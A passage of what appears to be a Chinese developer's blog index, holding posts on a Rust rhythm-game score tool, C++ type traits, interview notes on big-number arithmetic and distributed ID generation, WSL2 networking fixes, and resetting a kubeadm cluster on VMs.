rollback，这种情况下忽略。 如果当前 key 已经被其他事务上锁，则 rollback 此 key。 如果当前 key 没有 prewrite（写入 data 列，也就是 default 列族），则 rollback。 如果锁为空，则 rollback 此 key。 如果都不是上述情况，则直接对此 key 进行 rollback，删除 default 列族中的值与锁。 KvResolveLock这个方法比较简单，就是收集到当前事务的所有 lock（上锁 ts == 事务 start_ts），然后根据请求里的 commit_version 字段来进行批量回滚（调用 KvBatchRollback）或者批量提交（调用 KvCommit）。 参考 https://pdos.csail.mit.edu/6.824/papers/raft-extended.pdf （Project2A） https://github.com/platoneko/tinykv （Project2B、Project2C） https://web.stanford.edu/~ouster/cgi-bin/papers/OngaroPhD.pdf （Project3） https://www.usenix.org/legacy/events/osdi10/tech/full_papers/Peng.pdf （Project4） http://mysql.taobao.org/monthly/2018/11/02/ （Project4）","tags":["个人项目"],"categories":["编程开发"]},{"title":"ruborute 开发日志","path":"/ruborute-dev-log/","content":"作为一个 SDVX 玩家，有一天在水群的时候看到了一位群友发了一下自己做的统计得分数据的脚本，于是催生了自己做一个查分器的想法。于是就有了 ruborute 这个项目。它的读音为 “Are you 暴龍天(ぼるて, borute)?”。我打算用这个文章来记录我在开发过程中思路。 2022-03-24由于自己搭了游戏服务器，所以不再使用氧无了。ruborute 仅支持氧无，所以需要添加对服务器上的 MySQL 数据库访问的支持。所以对整个项目结构进行了重构。首先是把游戏记录与歌曲信息的数据结构分离出来了一个 model 模块，然后将对氧无文件的访问放到了 data_source 模块，并抽象除了一个 DataSource trait，之后对服务器数据库的访问只需要实现这个 trait 即可。 由于有两个读取方式，所以也重构了一下命令行参数的读取，并抽象出来了一个 config 模块，以前只是单独的一个 Opt 结构。这里参考了 databend 对参数与配置文件读取的封装，使得软件既可以从命令行选项中获取参数，也可以从一个 toml 文件中获取。 经过这样一些操作之后，两种数据获取方式就可以由一下方式进行调度： 1234567891011121314151617181920impl Cmdline &#123; pub fn new(cfg: Config) -&gt; Result&lt;Self&gt; &#123; // ... match data_source::AsphyxiaDataSource::open(cfg.asyphyxia) &#123; // load from asyphyxia first Ok(s) =&gt; cmdline.add_commands(Rc::new(s)), // if load asyphyxia, load from bemaniutils server _ =&gt; cmdline.add_commands(Rc::new(data_source::BemaniutilsDataSource::open( cfg.bemaniutils, )?)), &#125;; &#125; fn add_commands&lt;D: &#x27;static + DataSource&gt;(&amp;mut self, ds: Rc&lt;D&gt;) &#123; self.add_command(Box::new(CmdRecord::new(Rc::clone(&amp;ds)))); self.add_command(Box::new(CmdBest50::new(Rc::clone(&amp;ds)))); self.add_command(Box::new(CmdVolforce::new(Rc::clone(&amp;ds)))); self.add_command(Box::new(CmdCount::new(Rc::clone(&amp;ds)))); &#125;&#125; 2021-9-18修复新纪录无法第一时间查询的 BUG由于氧无是在下一次启动的时候才会压缩存储日志，所以可能存在[重复记录](###修复可能出现重复记录的 BUG)，这个在之前已经修复，但是并没有注意到第一次读取的成绩可能不是最佳成绩，所以去重插入数据的时候需要判断一下。 这次终于下定决心把之前用 Vec 存同一首歌不同等级的记录改成了用 HashMap 存。 2021-9-14实现 Tab 补全与历史提示 rustyline 提供了 Completer 和 Hinter 这两个 trait 可以用来实现这两个功能。对于历史提示（就像 zsh 的 auto-suggestion 插件那样），只需要接入 rustyline 提供的 HistoryHinter 即可，Completer 则需要自己实现。 1234567891011121314151617/// To be called for tab-completion.pub trait Completer &#123; /// Takes the currently edited `line` with the cursor `pos`ition and /// returns the start position and the completion candidates for the /// partial word to be completed. /// /// (&quot;ls /usr/loc&quot;, 11) =&gt; Ok((3, vec![&quot;/usr/local/&quot;])) fn complete( &amp;self, line: &amp;str, pos: usize, ctx: &amp;Context&lt;&#x27;_&gt;, ) -&gt; Result&lt;(usize, Vec&lt;Self::Candidate&gt;)&gt; &#123; let _ = (line, pos, ctx); Ok((0, Vec::with_capacity(0))) &#125;&#125; 只需要实现这个 complete 方法即可。这个方法参数是当前的输入，当前输入字符串的位置以及一个上下文（不用管），返回是要替换的字符串开始的位置以及候选项列表。如果候选项只有一个，它会直接不全，否则会显示所有候选项（需要开启 CompletionType::List 模式）。 实现这个主要参考了 rustyline 官方给的例子 https://github.com/kkawakam/rustyline/tree/master/examples （主要是那个 example.rs）。 2021-9-3实现数据统计并发布 v0.1.1 版本这几天为 ruborute 实现了一个 count 指令，用途是统计每一个 level 的 S、AAA+、AAA、PUC、PUC、HC、NC 的数量，以及这个 level 的总歌曲数。写这个的时候唯一的感想就是，Rust 的 match 竟然没有其他语言 switch case 中的 fallthrough 语义。然后统计 level 数量是利用迭代器 trait 中的 filter().count() 来计数，感觉可以在这个基础上做一个类似于 Python 中 pandas 那样的库啊（可能已经有了）。 之后想把 ruborute 上传到 crates.io 以及类似于 Chocolatey 这样的 Windows 包管理平台上，然后上传个 docs.rs 啥的，那还得完善一下注释才行。。。瞬间感受到开源工作者们的伟大，要做出一个高可用的开源软件出来要做的事情也太多了。 2021-8-31发布 v0.1.0 版本今天为 ruborute 打了 v0.1.0 的 tag。并创建了 Github Actions 实现持续集成（CD）。当发布 tag 时会自动发布 Releases 并上传此 tag 的 build target。一开始本来像给可执行文件 ruborute.exe 打个压缩包的，但是暂时还没搞明白在 Github Actions 的 Windows 环境中该怎么打压缩包，应该是要先安装打包软件，但是我没找到合适的。所以就直接上传可执行文件到 Releases 了。 2021-8-30实现歌曲 Volforce 的计算根据 BEMANIWIKI 上记载的六代 VF 计算公式计算出每首歌的 VF，然后再求 VF 最高的 50 个记录的平均值。由于 Rust 的 f64 浮点数类型的比较实现起来比较繁琐，我将所有 VF 值都乘 1000 以整数方式记下来，方便比较与计算。不过我按照这个算下来的 VF 总比游戏里的高 0.01 左右，之后还得看看是怎么回事。 实现 Best 50 记录的查找按照上面计算出来的 VF 值查找最高的 50 个即可。一开始本来想用一个最大堆，优先队列来实现，后来还是图简单直接排序取 Best 50 了。 修复可能出现重复记录的 BUG今天发现第一天其实我错了，这个记录是有可能出现重复数据的，氧无服务器可能确实会在启动的时候会压缩一次记录，所以为了提高程序的鲁棒性，还是得在读取数据的时候加入判断重复的逻辑。 2021-8-28实现通过歌曲名查找游玩记录今天实现了通过歌曲名来查找游玩记录的功能。整体的思路是先到 music_store 通过音乐名找到对应的 music_id，然后再通过 music_id 到 record_store 中查找对应记录。在这里将 record_store 中通过 music_id 查找记录的方法改造成了批量读取，也就是参数是一系列 music_id，这样也易于功能的扩展。在歌名查找的问题上，我一开始想使用严格的正则匹配，但后来想没有几个人能记住完整的歌名，于是引入了模糊匹配（fuzzy matching），这里使用的轮子是 rust-fuzzy-search，实现了模糊匹配算法，使用起来也比较简单。目前对于名称的搜索，模糊匹配的评分（score）定的大于 0.5，这个评分对于英文来说还不错，对于汉字可能要差点。然后目前还需要优化的一个点就是这个算法是大小写敏感的，之后只需要在 filter 方法的闭包函数统一一下大小写即可优化。 通过写这个功能，我发现 Rust 里像 HashMap 和 Vec 这样的容器的迭代器的方法是真的香啊，只需要简单地调用 map, filter, flatten 这些方法再 collect 一下就能完成把想要的数据从容器里洗出来，这是比 C++ STL 方便的一点。 在启动时组合完整信息之前的 record_store 中只保存了 savedata.db 中的游玩记录信息，如果要输出完整信息，需要到 music_store 中查一下再组合成 FullRecord 输出。为了更加方便地编写业务代码，我决定在 ruborute 启动时，也就是读取数据文件时就组装出 FullRecord 然后存入 record_store 中。 2021-8-27引入 music_db.xml 的音乐信息今天的工作主要是接入游戏的音乐数据文件 data/others/music_db.xml，以支撑后续主要功能（查歌曲名、等级、VF等）的实现。不过要读这个 XML 文件可把我给难到了。XML Parser 的轮子自然不在少数，但是 music_db.xml 这个文件的编码是 shift-jis ，而 Rust 的默认读取格式是 UTF-8，而支持读取不同格式的 XML 库又异常的少。如果不做处理的话，一旦蹦到日文或者其他稀奇古怪的字符就会是乱码。所以急需一个支持读取非 UTF-8 编码的 XML 库。万幸的是，quick-xml 这个库的 encoding feature 支持不同编码。它通过 XML 文件一开始的 xml Event 中的 encoding 字段来判断整个文件的编码格式，然后用 encoding_rs 这个库来解码，并转成 UTF-8 格式。而且更好的是，quick-xml 可以直接集成到 serde 中。虽然一开始我为了优化内存，并不想一口气读入整个 JSON 和 XML 文件，但是我并没有想到一个比较好的方法来使用 quick-xml + serde 流式读取 XML 文件，于是目前想的还是一次性载入所有数据到内存中（目前启动 ruborute 大概需要 1.2MB 内存）。实现了 music_db.xml 的读取之后，便可以顺利为歌曲数据输出歌曲名字和等级的信息了。 优化 Cmdline 模块今天还未 Cmd 这个 trait 增加了 name(), usage(), description() 这三个方法。并增加了一个叫 Cmdline 的对象来保存实现了的 Cmd。优化了可扩展性，以后我加入命令只用专注于实现 Cmd ，然后再用 add_command 加入到 Cmdline 中即可，减少了后期工作量。 改造歌曲记录逻辑今天发现了一首歌一个难度的记录只会记录一次，所以删除了一些判重的逻辑。然后将 record_store 中 music_id 到 Record 的记录改造成了 Vec&lt;Record&gt; ，因为会有同一首歌不同难度的记录。为了查询的便捷，就将一首歌存一块了。 2021-8-26确定技术路线最开始是为决定这个项目的技术路线。由于我用的游戏服务器采用的 JSON 来存储所有的游戏数据，所以需要自己撸一个存储引擎。一开始我就想到了曾经做过的 PingCAP Talent Plan 的项目 simple-rust-kvs，做一个 DB Server，然后通过网络请求来获取数据，再通过后端渲染一个 HTML 页面之类的。但是发现其实并没有这个必要，因为对于这样一个需求有这样的特点： 游玩数据不可能超过万的量级。 一切数据都是在本地，使用查分工具都是在本地，也没必要做成 server。 还要设计 HTML 页面太麻烦了。 没有高并发的必要。 于是我选择做一个 command-line 的工具，用户只需要指定数据所在路径，再结合各种 flag 和 arg 来完成需求。为了更高的可用性，我决定将 ruborute 设计成交互式的 cli 工具。 接下来就是编程语言的选择了。一开始我是想用 C++ 来写，但是转念一想，这个项目必定要用上各种第三方的轮子，比如 cli 参数的读取，数据的反序列化，以及展示数据等等。所以我选择了和 C++ 差不多 Rust，后者有强大的社区资源支撑，不怕找不到轮子，而且能帮我复健一下 Rust 这门基本不用的语言（为什么不用最熟悉的 Go 是因为实在不想写 Go 了）。 就这样我决定使用 Rust 来编写这个 cli 应用，它具有以下的特点： 以交互式命令行的形式运行，用户输入特定的指令进行交互。 单线程。 一次性载入数据到内存。 具有美观的展示内容。 确定要使用的开源库对于命令行参数的实现，当然是选择了我们的老朋友 clap，使用的是 3.0.0-beta.2 版本，这个版本可以使用 derive 来定义 struct。这里还有一个坑的地方就是，需要在 Cargo.toml 中指定 calp = &quot;=3.0.0-beta.2&quot;，不然 cargo 会下载 beta.4 的版本，然而这个版本会有 bug。 对于 JSON 的反序列化，当然也是我们的老朋友 serde 和 serde_json。 对于交互式 io 的实现，我使用的是 rustyline，这个库能够方便地读取数据以及控制字符，还能自己做一些美化（比如颜色啥的）。 然后就是数据结果的展示。我想的是通过表（Table）的形式打印出来，于是就选择了 prettytable-rs 这个看起来比较好用也好看的库。 对于命令功能的可扩展性实现，我定义了一个 Cmd 的 trait，它必须拥有 do_cmd 的功能，然后通过 Rust 的 dyn Trait 来通过用户输入在运行时指定相应 Cmd。 实现通过音乐 id 查找游玩记录依靠以上开源组件，我实现了基本的从用户通过命令行启动 ruborute，再到输入交互式命令，再到打印出表结构数据的功能。","tags":["Rust","个人项目"],"categories":["编程开发"]},{"title":"C++ 类型萃取","path":"/cpp-type-traits/","content":"最近在网上冲浪的时候注意到了 &lt;cmath&gt; 中 sqrt 这个求平方根的函数。与 C 语言中的不同，C++ 将它重定义为了模板函数。在使用过程中我发现，这个函数的模板特化只能用整数类型，如果是其他类型，则会编译报错。 12345678#include &lt;cmath&gt;int main() &#123; std::sqrt&lt;int&gt;(1); // ok std::sqrt&lt;char&gt;(1); // ok std::sqrt&lt;double&gt;(1.0); // compile error return 0;&#125; g++ 编译报错： 12345678910111213141516171819202122$ g++ type_traits.cpptype_traits.cpp: In function ‘int main()’:type_traits.cpp:6:26: error: no matching function for call to ‘sqrt&lt;double&gt;(double)’ 6 | std::sqrt&lt;double&gt;(1.0); // compile error | ^In file included from type_traits.cpp:1:/usr/include/c++/9/cmath:475:5: note: candidate: ‘template&lt;class _Tp&gt; constexpr typename __gnu_cxx::__enable_if&lt;std::__is_integer&lt;_Tp&gt;::__value, double&gt;::__type std::sqrt(_Tp)’ 475 | sqrt(_Tp __x) | ^~~~/usr/include/c++/9/cmath:475:5: note: template argument deduction/substitution failed:/usr/include/c++/9/cmath: In substitution of ‘template&lt;class _Tp&gt; constexpr typename __gnu_cxx::__enable_if&lt;std::__is_integer&lt;_Tp&gt;::__value, double&gt;::__type std::sqrt(_Tp) [with _Tp = double]’:type_traits.cpp:6:26: required from here/usr/include/c++/9/cmath:475:5: error: no type named ‘__type’ in ‘struct __gnu_cxx::__enable_if&lt;false, double&gt;’$ clang++ type_traits.cpptype_traits.cpp:6:5: error: no matching function for call to &#x27;sqrt&#x27; std::sqrt&lt;double&gt;(1.0); // compile error ^~~~~~~~~~~~~~~~~/usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/cmath:475:5: note: candidate template ignored: substitution failure [with _Tp = double]: no type named &#x27;__type&#x27; in &#x27;__gnu_cxx::__enable_if&lt;false, double&gt;&#x27; sqrt(_Tp __x) ^1 error generated. 我大惊失色，C++ 也能指定模板特化类型了？遂打开源码一看： 1234567// cmathtemplate &lt;typename _Tp&gt;inline _GLIBCXX_CONSTEXPR typename __gnu_cxx::__enable_if&lt;__is_integer&lt;_Tp&gt;::__value, double&gt;::__type sqrt(_Tp __x) &#123; return __builtin_sqrt(__x);&#125; 我超，感觉有点牛逼，上网学习了一波，原来这种方法叫做类型萃取（type traits)，哇靠，Rust 是吧（ 凭着摸鱼摸到底的精神，我通过这个源码学习了一波这个 type traits 是如何实现的，在这里借助 sqrt 这个函数记录一下逐步的分析过程。 类型萃取注：以下内容可能由于操作系统平台不同以及编译器的不同存在些许差异，但是命名以及实现原理都大同小异。 sqrt 这个函数的定义乍一看很复杂，但其实十分的简单。简化之后来说就主要分为四个部分： 123456// 按照 C++ 标准改写template &lt;typename _Tp&gt; // 模板typename std::enable_if&lt;std::is_integral&lt;_Tp&gt;::value, double&gt;::type // 返回值类型定义sqrt(_Tp __x) &#123; // 形式参数类型定义 return __sqrt(__x); // 函数逻辑定义，调用内部 sqrt&#125; 简单看来，限定函数参数 __x 类型的就是这个 _Tp ，一定是定义返回值的那条语句的又限定了 _Tp 的类型取值。 1typename std::enable_if&lt;std::is_integral&lt;_Tp&gt;::value, double&gt;::type 按照字面上的意思来看，这个语句的意思是，返回值类型是从 std::enable_if 这个结构的作用域中导出，当 std::is_integral&lt;_Tp&gt; 为 true 时，导出的 type 为 double。那这个具体又是如何实现的呢？我们由外到内来分析一下这个语句。 1. typename首先 typename 这个关键字限定了最后导出的这个 ::type 一定是个类型，而不是一个变量。 2. std::enable_if这个结构体的定义就是 type traits 的精髓了。 12345// type_traits.htemplate&lt;bool B, class T = void&gt;struct enable_if &#123;&#125;;template&lt;class T&gt;struct enable_if&lt;true, T&gt; &#123; typedef T type; &#125;; 这样的定义使用了 C++ 非类型模板参数与模板偏特化的特性。enable_if 的第一个参数是个 bool 类型的非类型模板参数 B，可以被赋值。然后 enable_if 又被偏特化出了一个 B 为 true 的结构，此结构中定义将模板参数 T 重命名为了 type。通过这样的操作，只有 std::enable_if&lt;true, T&gt; 的时候能过够通过作用域符导出 type，并且 type 就是 T 这个类型，如果 B == false，则不存在可以导出 type 的类型，导致类型不存在的编译错误。 简单来说，就是 typename std::enable_if&lt;B, T&gt;::type 的作用就是当 B 为 true 时，这个语句就相当于 T，否则就是不存在的类型。 3. std::is_integral了解了 enable_if 的作用之后就更加清晰了，std::is_integral&lt;_Tp&gt;::value 的值一定是个布尔值，那么它又是如何实现来判断 _Tp 是个整形的呢？下面列举了一个简化版的实现。 12345678910111213141516171819// type_traits.htemplate &lt;typename _Tp&gt;struct is_integral &#123; enum &#123; value = 0 &#125;;&#125;;template &lt;&gt;struct is_integral&lt;int&gt; &#123; enum &#123; value = 1 &#125;;&#125;;template &lt;&gt;struct is_integral&lt;bool&gt; &#123; enum &#123; value = 1 &#125;;&#125;;template &lt;&gt;struct is_integral&lt;char&gt; &#123; enum &#123; value = 1 &#125;;&#125;;// ... 后面还有其他整数类型// ... 非整数类型没有相关特化实现 和 enable_if 一样，只有 _Tp 为整数类型（也就是以上实现了 _is_integral 特化的结构）才会有相应的结构定义，非整数类型会因为没有相应结构的定义而出错。 实际上 std::is_intergral 这个结构的定义并非如此简单，不同平台的实现也不一样，还经过了一系列的 typedef、派生等处理，不过归根到底最后的思想就是利用偏特化来指定类型实现。 Constraints以上就是 C++20 之前对模板的类型萃取，但随着时代的进步，C++20 推出了 concept 和 requires 这两个关键字。 cppreference 上的例子： 1234567891011121314151617181920212223242526272829#include &lt;string&gt;#include &lt;cstddef&gt;#include &lt;concepts&gt;using namespace std::literals; // 概念 &quot;Hashable&quot; 的声明，可被符合以下条件的任何类型 T 满足：// 对于 T 类型的值 a，表达式 std::hash&lt;T&gt;&#123;&#125;(a) 可编译且其结果可转换为 std::size_ttemplate&lt;typename T&gt;concept Hashable = requires(T a) &#123; &#123; std::hash&lt;T&gt;&#123;&#125;(a) &#125; -&gt; std::convertible_to&lt;std::size_t&gt;;&#125;; struct meow &#123;&#125;; template&lt;Hashable T&gt;void f(T); // 受约束的 C++20 函数模板 // 应用相同约束的另一种方式：// template&lt;typename T&gt;// requires Hashable&lt;T&gt;// void f(T); // // template&lt;typename T&gt;// void f(T) requires Hashable&lt;T&gt;; int main() &#123; f(&quot;abc&quot;s); // OK，std::string 满足 Hashable f(meow&#123;&#125;); // 错误：meow 不满足 Hashable&#125; 这语法我怎么感觉在 Rust 里见过？（ 更多内容：https://en.cppreference.com/w/cpp/language/constraints","tags":["C++","语言特性"],"categories":["编程开发"]},{"title":"2021年4月20日 TEG 云架构部门面经","path":"/2021-4-20-tx-interview/","content":"2021年4月20日 TEG 云架构部门面经 一面这次面试我觉得算是我所有面试中（虽然也没面过几次）体验最好的，没有问一道八股，感觉问的全是和部门工作内容紧紧相关的问题。面试官人也很好，虽然问的问题一开始我都答不上来，但是他会一层一层地引导我。结束之后再来看，其实一共也没问几个问题，但是因为我太菜了，足足面了1个半小时。 起手式 按照常规首先做了个自我介绍。 问了问我之前在字节的工作内容。 看到我简历里写了自己动手实现过 raft，然后问了一下我的具体实现，以及我是如何利用 raft 做一个存储系统的。针对我的数据持久化又问了一些问题。最后得知我的 raft 并不支持动态添加节点，遂作罢。 我旁敲侧击了一下说自己最近在实现一个存储引擎（指 CMU 15-445 的 project），自己手写了 b+ tree 和 query executor 啥的。不过面试官得知了这个存储引擎是单机的之后便不感兴趣了。 手撕代码 写一个大数加法。 1string add(string a, string b); 这个直接从最低位一次向前加就行，保留一个进位变量。这个就是要注意一下不等长的情况，以及最低位是从 string 尾开始。只要没不想我被前进方向绕昏了还是能很快写出来的。 利用上面的大数加法实现大数乘法 1string mul(string a, string b); 一开始我本来想直接按照人类的思维硬怼的，但面试官说你这么写没啥意义，还是用分治法吧。 具体思路就是利用递归写分治法，每次将较长的那个数分割成两半，分别求乘积，再组合起来即可。 1234string part1 = mul(longer.substr(0, longer.size() / 2), shorter); // 高位string part2 = mul(longer.substr(longer.size(), longer.size() - longer.size() / 2), shorter); // 低位add_zero(part1, longer.size() / 2); // 给 part1 补 longer.size() / 2 个 0ans = add(part1, part2); // 利用上面的 add 函数 这里要注意的仍然是方向的问题，不然会像我一样直接丢人。还有就是 string 的 substr 方法第二个参数是指定个数，不是结尾位置。某些语言的切片写多了就容易下意识地以为是结尾位置，如果是 C++ 的话那一般会让你传迭代器。 分布式 ID 生成器设计一个分布式 ID 生成器，每次请求系统生成器会返回一个 ID，每次请求得到的是唯一且递增的。要求尽量做到高并发高可用。 一开始我的想法和 raft 类似，采用主从结构，每次都从 leader 请求 ID，请求之后 ID 递增，leader 再同步到每个 follower 上。然后面试官说这样 leader 就成为了瓶颈，如何优化一下。 在面试官的提示下得出了第二个方案。还是主从结构，但是 leader 向 follower 的同步变为了批量方式，就是让 leader 每次攒够一波网络热门生物视频 n 次递增 ID 之后再向 follower 同步。然后如果遇到了 leader 挂了需要更换 leader 时，新 leader 直接在现有 ID 基础上 +n+1 即可保证后续的正确性。不过这个方案在每个节点上还是存在很大的性能瓶颈，能不能再优化。 于是得到了第三个方案，那就是采用无主结构。现在想起来我自己的给的方案是错的，但是面试官并没有发现。晚上经室友提醒，这不就是雪花算法（snowflake）嘛（参考：某篇知乎），不过面试官貌似想让我答的不是雪花这种方法。 随机数产生器这里用 rand(a, b) 表示生成一个在闭区间 [a, b] 之间的整数。 首先来了个简单的，问如何用 rand(0, 2^16-1) 构造 rand(0, 2^64-1)。这个还算简单，就是 rand(0, 2^16-1) 四次，然后在按位组合起来。（也就是进制转换的思想）。 然后问如何用 rand(0,6) 构造 rand(0,9)，然后果不其然我答不上来，然后面试官进行了下一步铺垫，如何用 rand(0,6) 构造 rand(0,48)，这个其实和上面的类似。rand(0,6) 产生一个数的概率是 1/7，rand(0,48) 产生一个数的概率是 1/49，这不刚好是平方关系嘛。和 1 类似，按照进制转换结合两个数即可（若第一个产生的数是 a，第二个是 b，那结果就是 7a+b，符合概率和数字分布）。 得到 rand(0,48) 之后，怎么用它构造 rand(0,9) 呢？不会，好，下一个铺垫，如何构造 rand(0,47)？那使用 rand(0,48) 生成一个随机数，如果产生的数是 48，那再来一遍，直到满足为止。 那么接下来怎么用 rand(0,48) 构造 rand(0,9) 呢？抛弃掉所有大于 9 的？不太现实。那就利用除法，抛弃掉大于 39 的就是了，然后再除以 4 就可以了（为什么是 39，因为 0-39 的概率是 1/40，0-9 的概率是 1/10，刚好是 4 对 1 的转换）。 以上过程就能用 rand(0,6) 构造一个 rand(0,9) 了。 然后接下来问了如何设计一个筛选器，按概率选择对象 A 和 B呢（A 出现的概率为 x，B 出现的概率是 y，x+y=1）。我说，就直接用上面的方法构造一个宽度很大的随机数产生器，随机出一个数看在哪个区域里即可。 然后将上面的两个对象扩展为 n 个数。遇上同理，每一个对象对应一个随机数区间，然后用一个哈希表之类的维护一下就行。 其他有没有用过 C++11、C++17 啥的。写 C++ 的时候有啥使用右值引用的场景。然后我当时卡壳了没想起来，然后结束之后一想，这不就是 std::move() 嘛？然后无了。具体右值引用的东西还得下来看看。","tags":["腾讯面试","C++","分布式"],"categories":["面经"]},{"title":"用 Windows 开发遇到的各种问题","path":"/develop-with-issues-on-windows/","content":"自从之前那段实习结束之后，我的日常开发就转变成了 Windows 10 + WSL2 的方式。刚开始的时候还觉得特爽，等新鲜感过去，这种模式成为常态之后， Windows 以及 WSL2 的各种毛病都逐渐涌现了出来。为了防止我之后再次遇到又变得一筹莫展，我将在这个文章里记录我使用 Windows 10 开发所遇到的各种问题（大概是会持续更新的……）。 Windows 侧端口被占用的问题问题发现起因是我有一天早上起来运行我的一个 React 前端项目，然后发现使用 yarn start 执行预设定好的启动脚本启动项目一直失败，报错 5555 端口被占用，重启电脑仍无法解决。这个 5555 端口并不是我自己某个设定中的端口，我觉得应该是我用的某个第三方模组，或者 Node 自生需要的端口，所以我没办法直接更改相关硬编码，只有寻求问题根本所在。 问题原理与解决办法WSL2 是依托于 Hyper-V 进行虚拟化的，而这次的问题就处在 Hyper-V 上。在 Windows 启动后，Hyper-V 会预留几个范围的端口以便后续使用，而这次我就遇到了它将我需要用的 5555 端口占用了。通过以下指令可以查看被占用的端口范围： 1netsh interface ipv4 show excludedportrange protocol=tcp 会得到像下面这样类似的输出 123456789101112131415协议 tcp 端口排除范围开始端口 结束端口---------- -------- 50000 50059 * 60767 60866 60967 61066 61067 61166 61167 61266 61267 61366 61367 61466 61855 61954 64121 64220* - 管理的端口排除。 所以的这里的解决办法就是不断地重启系统直至需要的端口不被预留占用为止。 上面的端口排除通常是由 Windows NAT Driver 操作的，所以可以通过关闭它来清除端口占用，然后再重启。 12net stop winnatnet start winnat 参考 https://github.com/docker/for-win/issues/3171#issuecomment-739740248 http://www.herlitz.nu/2020/12/01/docker-error-ports-are-not-available-on-windows-10/ WSL2 无法访问局域网 IP 以及互联网问题发现今天早上起来打开 WSL2 并使用 VSCode 的 Leetcode 插件准备水道题的，然后发现题怎么样都拉不下来，一直超时，然后发现原来是“断网了”。具体症状表现为：Windows 宿主机可以 ping 通 WSL2，WSL2 无法 ping 通 Windows 宿主机、无法 ping 通局域网中的虚拟机、无法 ping 同互联网上的域名与 IP，重启 WSL2 与 Windows 都无法解决这个问题。一开始以为是 Windows 防火墙的问题，然后给 Windows 的防火墙加了一条入站策略，发现可以 ping 通宿主机了，但是还是无法连接其他 IP 与域名，（我觉得 Windows 防火墙应该也不会妨碍 WSL2 访问外网吧？），所以应该不是防火墙的问题。我又检查了 ip route 与 DNS 发现都是正常的。 然后我尝试平时挂代理的方式把 http 和 https 代理到了 Windows 宿主机上，发现是可以请求到外网的数据的。但这并不是一个长久之计，而且只能走 http 请求明显无法满足我的需求。 然后我东搜西找终于在 GitHub 上找到了下面的这条奇葩方法。 问题原理与解决办法这个问题的原理我目前还不知道，不知道会不会和我前一天重启了 Windows NAT Driver 有关，如果有人知道了可以通过我的邮箱或者其他 SNS 联系我（如果有人看到了的我这篇文章的话……）。 解决办法是到 控制面板-&gt;硬件和声音-&gt;电源选项-&gt;系统设置 里把 启用快速启动 取消勾选，然后重启电脑，然后就可以正常上网了，没错，就是这么简单…… 能找到这个解决办法的老哥真的是个神人……希望微软之后能修复这个 bug 吧…… 参考 https://github.com/microsoft/WSL/issues/4275#issuecomment-740043852 https://stephenreescarter.net/wsl2-network-issues-and-win-10-fast-start-up/ https://blog.csdn.net/swordsm/article/details/107948497 （并未解决此次问题，但也许可以解决其他 WSL2 的网络问题？） WSL2 网络代理现在的大陆的网络环境害的我们不得不掌握科学上网的技能，又是 WSL2 虚拟化的缘故，当使用科学上网工具进行系统代理时没法将 WSL2 侧的网络也给代理了，于是需要做一些特殊的操作。关于这个的文章网上其实有很多，我这里就简单的记录以下。 解决办法就是把请求代理（我就只做了 http 与 https 的，其他协议的咱也不知道怎么弄）到 Windows 宿主机这边的科学上网工具的端口上。 12345678910#!bin/bash# WSL2 局域网的宿主机 IPhost_ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;)protocol=科学上网工具使用的协议port=科学上网工具的本地监听端口export http_proxy=&quot;$protocol://$host_ip:$port&quot;export https_proxy=&quot;$protocol://$host_ip:$port&quot;# 取消代理# unset http_proxy# unset https_proxy 可以把这个写成一个脚本放在某个地方，然后每次要用的时候就执行一下就行了，相应的可以再写一个取消代理的脚本。不过有一点要注意的就是，使用 sh 执行是会新开一个 shell 来执行的，这样环境变量并没有加载到当前 shell 上，还是無駄的，所以应该用 source 来执行。 另外值得说的一点是，/etc/resolv.conf 这个文件是 WSL 自动生成的，里面记录 DNS 的地址，在 WSL2 里就是宿主机的 IP，所以可以通过提取这个文件的内容然后在进行一些简单的文本操作就能拿到宿主机 IP。整个文件的内容类似下面这样： 1234# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:# [network]# generateResolvConf = falsenameserver 172.31.208.1 看看微软之后还能给我整些什么活看看微软之后还能给我整些什么活……","tags":["Windows","WSL2"],"categories":["问题解决"]},{"title":"记一次虚拟机搭建 k8s 集群踩的坑","path":"/k8s-vm-restart/","content":"毕设开发中使用 k8s 遇到的一些问题与解决办法。 背景为了做毕设我用 VMware Workstation 创建了三台 Ubuntu Live Server 20.04.2 LTS 虚拟机来模拟一个三节点（Master * 1, Node * 2）的 k8s 集群，也成功地搭建了整个集群，然后我就将虚拟机挂机搁置了几天。当我重新打开三台虚拟机并在 master 上使用 kubectl get nodes 查看集群地时候，我发现两个 node 节点都处于 Not Ready 的状态，这明显不符合预期现象，于是我就把三台虚拟机都重启了（毕竟重启大法好），结果好家伙，这一重启什么都无了。 问题发现一直盯着报错干瞪眼肯定是不可取的，于是我终于想起来可以看看运行日志。 123service kubelet status# 或者journalctl -u kubelet.service -e 结果发现是因为 master 节点（以及 node 节点）因为重启 IP地址都变了！然后 APIServer 就找不到各个节点。所以我现在要做的就是把 IP 地址归位。 一开始我只是简单的用 ifconfig 命令把节点的 IP 地址强行改了，然后发现还是不行，估计是由于 APIServer 需要配置各种证书，然后 IPv4 网关和 DNS 什么的也都没有配，一大堆乱七八糟的，索性直接重新搭建集群，并给虚拟机分配静态地址。 问题解决给虚拟机分配静态地址此方法只针对 Ubuntu Live Server 20.04.2 LTS，不同 OS 或者 Ubuntu 版本可能略有差异，并且我的虚拟机网络采用的 NAT 模式。 这个做起来其实很简单，首先进入 VMware Workstation 的编辑 -&gt; 虚拟网络编辑器 -&gt; NAT 设置，记下网关 IP，比如我的是 192.168.58.2，然后宿主机侧就不需要干什么了。 进入虚拟机，编辑文件 /etc/netplan/00-installer-config.yaml: 1234567891011121314# This is the network config written by &#x27;subiquity&#x27;network: ethernets: ens33: # 要分配的静态地址 addresses: [192.168.58.128/24] # 关闭 DHCP dhcp4: false # 网关地址，即上面的那个地址 gateway4: 192.168.58.2 nameservers: # 网关地址 addresses: [192.168.58.2] version: 2 然后执行： 1sudo netplan apply 这样便可给虚拟机指定一个静态的 IP 地址，也不影响虚拟机和宿主机的互相访问。然后对每个节点进行同样的操作，只要 IP 地址不一样就行。 重置 Kubernetes 集群在所有节点上执行重置命令： 1sudo kubeadm reset 在 master 节点上执行 init 命令，并重新创建 .kube目录。 12345sudo kubeadm init --image-repository=registry.aliyuncs.com/google_containersrm -rf $HOME/.kubemkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config 然后再让 node 节点重新 join 集群就可以了。 